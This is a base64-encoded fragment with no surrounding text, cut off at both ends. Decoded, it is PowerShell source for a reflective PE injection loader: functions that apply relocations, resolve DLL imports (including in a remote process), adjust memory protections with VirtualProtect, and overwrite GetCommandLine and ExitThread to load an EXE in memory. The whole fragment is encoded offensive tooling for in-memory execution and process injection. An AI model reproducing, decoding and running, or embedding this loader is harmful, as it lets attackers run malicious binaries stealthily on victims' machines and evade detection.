0ludDY0XSRDdXJyQWRkcikgKCRCYXNlRGlmZmVyZW5jZSkpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJEN1cnJBZGRyID0gW0ludFB0cl0oU3ViLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kQ3VyckFkZHIpICgkQmFzZURpZmZlcmVuY2UpKQogICAgICAgICAgICAgICAgICAgIH0gICAgICAgICAgICAgICAKCiAgICAgICAgICAgICAgICAgICAgW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U3RydWN0dXJlVG9QdHIoJEN1cnJBZGRyLCAkRmluYWxBZGRyLCAkZmFsc2UpIHwgT3V0LU51bGwKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2VpZiAoJFJlbG9jVHlwZSAtbmUgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1JFTF9CQVNFRF9BQlNPTFVURSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAjSU1BR0VfUkVMX0JBU0VEX0FCU09MVVRFIGlzIGp1c3QgdXNlZCBmb3IgcGFkZGluZywgd2UgZG9uJ3QgYWN0dWFsbHkgZG8gYW55dGhpbmcgd2l0aCBpdAogICAgICAgICAgICAgICAgICAgIFRocm93ICJVbmtub3duIHJlbG9jYXRpb24gZm91bmQsIHJlbG9jYXRpb24gdmFsdWU6ICRSZWxvY1R5cGUsIHJlbG9jYXRpb25pbmZvOiAkUmVsb2NhdGlvbkluZm8iCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgCiAgICAgICAgICAgICRCYXNlUmVsb2NQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRCYXNlUmVsb2NQdHIpIChbSW50NjRdJEJhc2VSZWxvY2F0aW9uVGFibGUuU2l6ZU9mQmxvY2spKQogICAgICAgIH0KICAgIH0KCgogICAgRnVuY3Rpb24gSW1wb3J0LURsbEltcG9ydHMKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRQRUluZm8sCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDEsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJGdW5jdGlvbnMsCiAgICAgICAgCiAgICAgICAgW1BhcmFtZXRlcihQb3NpdGlvbiA9IDIsIE1hbmRhdG9yeSA9ICR0cnVlKV0KICAgICAgICBbU3lzdGVtLk9iamVjdF0KICAgICAgICAkV2luMzJUeXBlcywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkNvbnN0YW50cywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gNCwgTWFuZGF0b3J5ID0gJGZhbHNlKV0KICAgICAgICBbSW50UHRyXQogICAgICAgICRSZW1vdGVQcm9jSGFuZGxlCiAgICAgICAgKQogICAgICAgIAogICAgICAgICRSZW1vdGVMb2FkaW5nID0gJGZhbHNlCiAgICAgICAgaWYgKCRQRUluZm8uUEVIYW5kbGUgLW5lICRQRUluZm8uRWZmZWN0aXZlUEVIYW5kbGUpCiAgICAgICAgewogICAgICAgICAgICAkUmVtb3RlTG9hZGluZyA9ICR0cnVlCiAgICAgICAgfQogICAgICAgIAogICAgICAgIGlmICgkUEVJbmZvLklNQUdFX05UX0hFQURFUlMuT3B0aW9uYWxIZWFkZXIuSW1wb3J0VGFibGUuU2l6ZSAtZ3QgMCkKICAgICAgICB7CiAgICAgICAgICAgIFtJbnRQdHJdJEltcG9ydERlc2NyaXB0b3JQdHIgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLk9wdGlvbmFsSGVhZGVyLkltcG9ydFRhYmxlLlZpcnR1YWxBZGRyZXNzKQogICAgICAgICAgICAKICAgICAgICAgICAgd2hpbGUgKCR0cnVlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkSW1wb3J0RGVzY3JpcHRvciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RydWN0dXJlKCRJbXBvcnREZXNjcmlwdG9yUHRyLCBbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9JTVBPUlRfREVTQ1JJUFRPUikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgI0lmIHRoZSBzdHJ1Y3R1cmUgaXMgbnVsbCwgaXQgc2lnbmFscyB0aGF0IHRoaXMgaXMgdGhlIGVuZCBvZiB0aGUgYXJyYXkKICAgICAgICAgICAgICAgIGlmICgkSW1wb3J0RGVzY3JpcHRvci5DaGFyYWN0ZXJpc3RpY3MgLWVxIDAgYAogICAgICAgICAgICAgICAgICAgICAgICAtYW5kICRJbXBvcnREZXNjcmlwdG9yLkZpcnN0VGh1bmsgLWVxIDAgYAogICAgICAgICAgICAgICAgICAgICAgICAtYW5kICRJbXBvcnREZXNjcmlwdG9yLkZvcndhcmRlckNoYWluIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5OYW1lIC1lcSAwIGAKICAgICAgICAgICAgICAgICAgICAgICAgLWFuZCAkSW1wb3J0RGVzY3JpcHRvci5UaW1lRGF0ZVN0YW1wIC1lcSAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIkRvbmUgaW1wb3J0aW5nIERMTCBpbXBvcnRzIgogICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgJEltcG9ydERsbEhhbmRsZSA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAkSW1wb3J0RGxsUGF0aFB0ciA9IChBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uUEVIYW5kbGUpIChbSW50NjRdJEltcG9ydERlc2NyaXB0b3IuTmFtZSkpCiAgICAgICAgICAgICAgICAkSW1wb3J0RGxsUGF0aCA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlB0clRvU3RyaW5nQW5zaSgkSW1wb3J0RGxsUGF0aFB0cikKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgKCRSZW1vdGVMb2FkaW5nIC1lcSAkdHJ1ZSkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkSW1wb3J0RGxsSGFuZGxlID0gSW1wb3J0LURsbEluUmVtb3RlUHJvY2VzcyAtUmVtb3RlUHJvY0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtSW1wb3J0RGxsUGF0aFB0ciAkSW1wb3J0RGxsUGF0aFB0cgogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRJbXBvcnREbGxIYW5kbGUgPSAkV2luMzJGdW5jdGlvbnMuTG9hZExpYnJhcnkuSW52b2tlKCRJbXBvcnREbGxQYXRoKQogICAgICAgICAgICAgICAgfQoKICAgICAgICAgICAgICAgIGlmICgoJEltcG9ydERsbEhhbmRsZSAtZXEgJG51bGwpIC1vciAoJEltcG9ydERsbEhhbmRsZSAtZXEgW0ludFB0cl06Olplcm8pKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIHRocm93ICJFcnJvciBpbXBvcnRpbmcgRExMLCBETExOYW1lOiAkSW1wb3J0RGxsUGF0aCIKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgI0dldCB0aGUgZmlyc3QgdGh1bmssIHRoZW4gbG9vcCB0aHJvdWdoIGFsbCBvZiB0aGVtCiAgICAgICAgICAgICAgICBbSW50UHRyXSRUaHVua1JlZiA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJEltcG9ydERlc2NyaXB0b3IuRmlyc3RUaHVuaykKICAgICAgICAgICAgICAgIFtJbnRQdHJdJE9yaWdpbmFsVGh1bmtSZWYgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoJFBFSW5mby5QRUhhbmRsZSkgKCRJbXBvcnREZXNjcmlwdG9yLkNoYXJhY3RlcmlzdGljcykgI0NoYXJhY3RlcmlzdGljcyBpcyBvdmVybG9hZGVkIHdpdGggT3JpZ2luYWxGaXJzdFRodW5rCiAgICAgICAgICAgICAgICBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmVmFsID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE9yaWdpbmFsVGh1bmtSZWYsIFtUeXBlXVtJbnRQdHJdKQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB3aGlsZSAoJE9yaWdpbmFsVGh1bmtSZWZWYWwgLW5lIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRMb2FkQnlPcmRpbmFsID0gJGZhbHNlCiAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kUHJvY2VkdXJlTmFtZVB0ciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgI0NvbXBhcmUgdGh1bmtSZWZWYWwgdG8gSU1BR0VfT1JESU5BTF9GTEFHLCB3aGljaCBpcyBkZWZpbmVkIGFzIDB4ODAwMDAwMDAgb3IgMHg4MDAwMDAwMDAwMDAwMDAwIGRlcGVuZGluZyBvbiAzMmJpdCBvciA2NGJpdAogICAgICAgICAgICAgICAgICAgICMgICBJZiB0aGUgdG9wIGJpdCBpcyBzZXQgb24gYW4gaW50LCBpdCB3aWxsIGJlIG5lZ2F0aXZlLCBzbyBpbnN0ZWFkIG9mIHdvcnJ5aW5nIGFib3V0IGNhc3RpbmcgdGhpcyB0byB1aW50CiAgICAgICAgICAgICAgICAgICAgIyAgIGFuZCBkb2luZyB0aGUgY29tcGFyaXNvbiwganVzdCBzZWUgaWYgaXQgaXMgbGVzcyB0aGFuIDAKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSROZXdUaHVua1JlZiA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgaWYoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSAtZXEgNCAtYW5kIFtJbnQzMl0kT3JpZ2luYWxUaHVua1JlZlZhbCAtbHQgMCkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJFByb2NlZHVyZU5hbWVQdHIgPSBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmVmFsIC1iYW5kIDB4ZmZmZiAjVGhpcyBpcyBhY3R1YWxseSBhIGxvb2t1cCBieSBvcmRpbmFsCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2FkQnlPcmRpbmFsID0gJHRydWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZWlmKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bSW50UHRyXSkgLWVxIDggLWFuZCBbSW50NjRdJE9yaWdpbmFsVGh1bmtSZWZWYWwgLWx0IDApCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRQcm9jZWR1cmVOYW1lUHRyID0gW0ludDY0XSRPcmlnaW5hbFRodW5rUmVmVmFsIC1iYW5kIDB4ZmZmZiAjVGhpcyBpcyBhY3R1YWxseSBhIGxvb2t1cCBieSBvcmRpbmFsCiAgICAgICAgICAgICAgICAgICAgICAgICRMb2FkQnlPcmRpbmFsID0gJHRydWUKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgW0ludFB0cl0kU3RyaW5nQWRkciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkUEVJbmZvLlBFSGFuZGxlKSAoJE9yaWdpbmFsVGh1bmtSZWZWYWwpCiAgICAgICAgICAgICAgICAgICAgICAgICRTdHJpbmdBZGRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgJFN0cmluZ0FkZHIgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV1bVUludDE2XSkpCiAgICAgICAgICAgICAgICAgICAgICAgICRQcm9jZWR1cmVOYW1lID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJpbmdBbnNpKCRTdHJpbmdBZGRyKQogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VkdXJlTmFtZVB0ciA9IFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cmluZ1RvSEdsb2JhbEFuc2koJFByb2NlZHVyZU5hbWUpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmICgkUmVtb3RlTG9hZGluZyAtZXEgJHRydWUpCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSROZXdUaHVua1JlZiA9IEdldC1SZW1vdGVQcm9jQWRkcmVzcyAtUmVtb3RlUHJvY0hhbmRsZSAkUmVtb3RlUHJvY0hhbmRsZSAtUmVtb3RlRGxsSGFuZGxlICRJbXBvcnREbGxIYW5kbGUgLUZ1bmN0aW9uTmFtZVB0ciAkUHJvY2VkdXJlTmFtZVB0ciAtTG9hZEJ5T3JkaW5hbCAkTG9hZEJ5T3JkaW5hbAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSROZXdUaHVua1JlZiA9ICRXaW4zMkZ1bmN0aW9ucy5HZXRQcm9jQWRkcmVzc0ludFB0ci5JbnZva2UoJEltcG9ydERsbEhhbmRsZSwgJFByb2NlZHVyZU5hbWVQdHIpCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIGlmICgkTmV3VGh1bmtSZWYgLWVxICRudWxsIC1vciAkTmV3VGh1bmtSZWYgLWVxIFtJbnRQdHJdOjpaZXJvKQogICAgICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAgICAgaWYgKCRMb2FkQnlPcmRpbmFsKQogICAgICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICBUaHJvdyAiTmV3IGZ1bmN0aW9uIHJlZmVyZW5jZSBpcyBudWxsLCB0aGlzIGlzIGFsbW9zdCBjZXJ0YWlubHkgYSBidWcgaW4gdGhpcyBzY3JpcHQuIEZ1bmN0aW9uIE9yZGluYWw6ICRQcm9jZWR1cmVOYW1lUHRyLiBEbGw6ICRJbXBvcnREbGxQYXRoIgogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICAgICAgICAgVGhyb3cgIk5ldyBmdW5jdGlvbiByZWZlcmVuY2UgaXMgbnVsbCwgdGhpcyBpcyBhbG1vc3QgY2VydGFpbmx5IGEgYnVnIGluIHRoaXMgc2NyaXB0LiBGdW5jdGlvbjogJFByb2NlZHVyZU5hbWUuIERsbDogJEltcG9ydERsbFBhdGgiCiAgICAgICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICAgICB9CgogICAgICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlN0cnVjdHVyZVRvUHRyKCROZXdUaHVua1JlZiwgJFRodW5rUmVmLCAkZmFsc2UpCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgJFRodW5rUmVmID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKFtJbnQ2NF0kVGh1bmtSZWYpIChbU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzLk1hcnNoYWxdOjpTaXplT2YoW1R5cGVdW0ludFB0cl0pKQogICAgICAgICAgICAgICAgICAgIFtJbnRQdHJdJE9yaWdpbmFsVGh1bmtSZWYgPSBBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRPcmlnaW5hbFRodW5rUmVmKSAoW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXVtJbnRQdHJdKSkKICAgICAgICAgICAgICAgICAgICBbSW50UHRyXSRPcmlnaW5hbFRodW5rUmVmVmFsID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJE9yaWdpbmFsVGh1bmtSZWYsIFtUeXBlXVtJbnRQdHJdKQoKICAgICAgICAgICAgICAgICAgICAjQ2xlYW51cAogICAgICAgICAgICAgICAgICAgICNJZiBsb2FkaW5nIGJ5IG9yZGluYWwsIFByb2NlZHVyZU5hbWVQdHIgaXMgdGhlIG9yZGluYWwgdmFsdWUgYW5kIG5vdCBhY3R1YWxseSBhIHBvaW50ZXIgdG8gYSBidWZmZXIgdGhhdCBuZWVkcyB0byBiZSBmcmVlZAogICAgICAgICAgICAgICAgICAgIGlmICgoLW5vdCAkTG9hZEJ5T3JkaW5hbCkgLWFuZCAoJFByb2NlZHVyZU5hbWVQdHIgLW5lIFtJbnRQdHJdOjpaZXJvKSkKICAgICAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgICAgIFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OkZyZWVIR2xvYmFsKCRQcm9jZWR1cmVOYW1lUHRyKQogICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VkdXJlTmFtZVB0ciA9IFtJbnRQdHJdOjpaZXJvCiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAkSW1wb3J0RGVzY3JpcHRvclB0ciA9IEFkZC1TaWduZWRJbnRBc1Vuc2lnbmVkICgkSW1wb3J0RGVzY3JpcHRvclB0cikgKFtTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMuTWFyc2hhbF06OlNpemVPZihbVHlwZV0kV2luMzJUeXBlcy5JTUFHRV9JTVBPUlRfREVTQ1JJUFRPUikpCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICB9CgogICAgRnVuY3Rpb24gR2V0LVZpcnR1YWxQcm90ZWN0VmFsdWUKICAgIHsKICAgICAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtVSW50MzJdCiAgICAgICAgJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MKICAgICAgICApCiAgICAgICAgCiAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gMHgwCiAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9FWEVDVVRFKSAtZ3QgMCkKICAgICAgICB7CiAgICAgICAgICAgIGlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fUkVBRCkgLWd0IDApCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGlmICgoJFNlY3Rpb25DaGFyYWN0ZXJpc3RpY3MgLWJhbmQgJFdpbjMyQ29uc3RhbnRzLklNQUdFX1NDTl9NRU1fV1JJVEUpIC1ndCAwKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEVfUkVBRFdSSVRFCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfRVhFQ1VURV9SRUFECiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1dSSVRFKSAtZ3QgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9FWEVDVVRFX1dSSVRFQ09QWQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRQcm90ZWN0aW9uRmxhZyA9ICRXaW4zMkNvbnN0YW50cy5QQUdFX0VYRUNVVEUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlCiAgICAgICAgewogICAgICAgICAgICBpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1JFQUQpIC1ndCAwKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX1dSSVRFKSAtZ3QgMCkKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFEV1JJVEUKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICAgICAkUHJvdGVjdGlvbkZsYWcgPSAkV2luMzJDb25zdGFudHMuUEFHRV9SRUFET05MWQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgaWYgKCgkU2VjdGlvbkNoYXJhY3RlcmlzdGljcyAtYmFuZCAkV2luMzJDb25zdGFudHMuSU1BR0VfU0NOX01FTV9XUklURSkgLWd0IDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfV1JJVEVDT1BZCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFdpbjMyQ29uc3RhbnRzLlBBR0VfTk9BQ0NFU1MKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICAKICAgICAgICBpZiAoKCRTZWN0aW9uQ2hhcmFjdGVyaXN0aWNzIC1iYW5kICRXaW4zMkNvbnN0YW50cy5JTUFHRV9TQ05fTUVNX05PVF9DQUNIRUQpIC1ndCAwKQogICAgICAgIHsKICAgICAgICAgICAgJFByb3RlY3Rpb25GbGFnID0gJFByb3RlY3Rpb25GbGFnIC1ib3IgJFdpbjMyQ29uc3RhbnRzLlBBR0VfTk9DQUNIRQogICAgICAgIH0KICAgICAgICAKICAgICAgICByZXR1cm4gJFByb3RlY3Rpb25GbGFnCiAgICB9CgogICAgRnVuY3Rpb24gVXBkYXRlLU1lbW9yeVByb3RlY3Rpb25GbGFncwogICAgewogICAgICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUG9zaXRpb24gPSAwLCBNYW5kYXRvcnkgPSAkdHJ1ZSldCiAgICAgICAgW1N5c3RlbS5PYmplY3RdCiAgICAgICAgJFBFSW5mbywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMSwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkZ1bmN0aW9ucywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMiwgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMkNvbnN0YW50cywKICAgICAgICAKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMywgTWFuZGF0b3J5ID0gJHRydWUpXQogICAgICAgIFtTeXN0ZW0uT2JqZWN0XQogICAgICAgICRXaW4zMlR5cGVzCiAgICAgICAgKQogICAgICAgIAogICAgICAgIGZvciggJGkgPSAwOyAkaSAtbHQgJFBFSW5mby5JTUFHRV9OVF9IRUFERVJTLkZpbGVIZWFkZXIuTnVtYmVyT2ZTZWN0aW9uczsgJGkrKykKICAgICAgICB7CiAgICAgICAgICAgIFtJbnRQdHJdJFNlY3Rpb25IZWFkZXJQdHIgPSBbSW50UHRyXShBZGQtU2lnbmVkSW50QXNVbnNpZ25lZCAoW0ludDY0XSRQRUluZm8uU2VjdGlvbkhlYWRlclB0cikgKCRpICogW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6U2l6ZU9mKFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX1NFQ1RJT05fSEVBREVSKSkpCiAgICAgICAgICAgICRTZWN0aW9uSGVhZGVyID0gW1N5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcy5NYXJzaGFsXTo6UHRyVG9TdHJ1Y3R1cmUoJFNlY3Rpb25IZWFkZXJQdHIsIFtUeXBlXSRXaW4zMlR5cGVzLklNQUdFX1NFQ1RJT05fSEVBREVSKQogICAgICAgICAgICBbSW50UHRyXSRTZWN0aW9uUHRyID0gQWRkLVNpZ25lZEludEFzVW5zaWduZWQgKCRQRUluZm8uUEVIYW5kbGUpICgkU2VjdGlvbkhlYWRlci5WaXJ0dWFsQWRkcmVzcykKICAgICAgICAgICAgCiAgICAgICAgICAgIFtVSW50MzJdJFByb3RlY3RGbGFnID0gR2V0LVZpcnR1YWxQcm90ZWN0VmFsdWUgJFNlY3Rpb25IZWFkZXIuQ2hhcmFjdGVyaXN0aWNzCiAgICAgICAgICAgIFtVSW50MzJdJFNlY3Rpb25TaXplID0gJFNlY3Rpb25IZWFkZXIuVmlydHVhbFNpemUKICAgICAgICAgICAgCiAgICAgICAgICAgIFtVSW50MzJdJE9sZFByb3RlY3RGbGFnID0gMAogICAgICAgICAgICBUZXN0LU1lbW9yeVJhbmdlVmFsaWQgLURlYnVnU3RyaW5nICJVcGRhdGUtTWVtb3J5UHJvdGVjdGlvbkZsYWdzOjpWaXJ0dWFsUHJvdGVjdCIgLVBFSW5mbyAkUEVJbmZvIC1TdGFydEFkZHJlc3MgJFNlY3Rpb25QdHIgLVNpemUgJFNlY3Rpb25TaXplIHwgT3V0LU51bGwKICAgICAgICAgICAgJFN1Y2Nlc3MgPSAkV2luMzJGdW5jdGlvbnMuVmlydHVhbFByb3RlY3QuSW52b2tlKCRTZWN0aW9uUHRyLCAkU2VjdGlvblNpemUsICRQcm90ZWN0RmxhZywgW1JlZl0kT2xkUHJvdGVjdEZsYWcpCiAgICAgICAgICAgIGlmICgkU3VjY2VzcyAtZXEgJGZhbHNlKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBUaHJvdyAiVW5hYmxlIHRvIGNoYW5nZSBtZW1vcnkgcHJvdGVjdGlvbiIKICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KICAgIAogICAgI1RoaXMgZnVuY3Rpb24gb3ZlcndyaXRlcyBHZXRDb21tYW5kTGluZSBhbmQgRXhpdFRocmVhZCB3aGljaCBhcmUgbmVlZGVkIHRvIHJlZmxlY3RpdmVseSBsb2FkIGFuIEVYRQogICAgI1JldHVybnMgYW4gb2J